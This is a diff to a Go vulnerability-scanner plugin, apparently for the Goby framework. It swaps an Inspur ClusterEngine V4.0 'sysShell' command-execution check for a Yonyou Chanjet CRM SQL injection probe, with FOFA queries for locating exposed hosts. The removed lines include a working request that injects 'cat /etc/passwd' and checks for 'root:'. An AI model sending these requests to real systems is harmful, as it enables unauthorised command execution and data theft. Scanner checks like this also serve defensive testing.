@@ -6,14 +6,15 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "浪潮ClusterEngineV4.0 sysShell 任意命令执行漏洞",
+  "Name": "用友畅捷通CRM SQL注入漏洞",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
-  "Author": "",
-  "FofaQuery": "title=\"TSCEV4.0\" || product=\"Inspur-ClusterEngine\" || \"ClusterEngine\"",
-  "GobyQuery": "title=\"TSCEV4.0\" || product=\"Inspur-ClusterEngine\" || \"ClusterEngine\"",
+  "PostTime": "2023-06-20",
+  "Author": "清晨",
+  "FofaQuery": "product=\"畅捷通-畅捷CRM\"",
+  "GobyQuery": "product=\"畅捷通-畅捷CRM\"",
   "Level": "3",
   "Impact": "",
   "Recommendation": "",
@@ -29,12 +30,12 @@ func init() {
     "AND",
     {
       "Request": {
-        "method": "POST",
-        "uri": "/sysShell",
+        "method": "GET",
+        "uri": "/WebSer~1/create_site.php?site_id=1",
         "follow_redirect": true,
         "header": {},
         "data_type": "text",
-        "data": "op=doPlease&node=cu01&command=cat /etc/passwd"
+        "data": ""
       },
       "ResponseTest": {
         "type": "group",
@@ -51,7 +52,7 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "root:",
+            "value": "register fail,please again",
             "bz": ""
           }
         ]
@@ -107,7 +108,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "浪潮ClusterEngineV4.0 sysShell 任意命令执行漏洞",
+      "Name": "用友畅捷通CRM SQL注入漏洞",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +117,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "tide ClusterEngineV4 sysShell rce",
+      "Name": "yonyou Chanjetcrm SQL Injection",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -131,8 +132,7 @@ func init() {
     "Service": null,
     "System": null,
     "Hardware": null
-  },
-  "PostTime": "2023-06-20"
+  }
 }`
 
 	ExpManager.AddExploit(NewExploit(
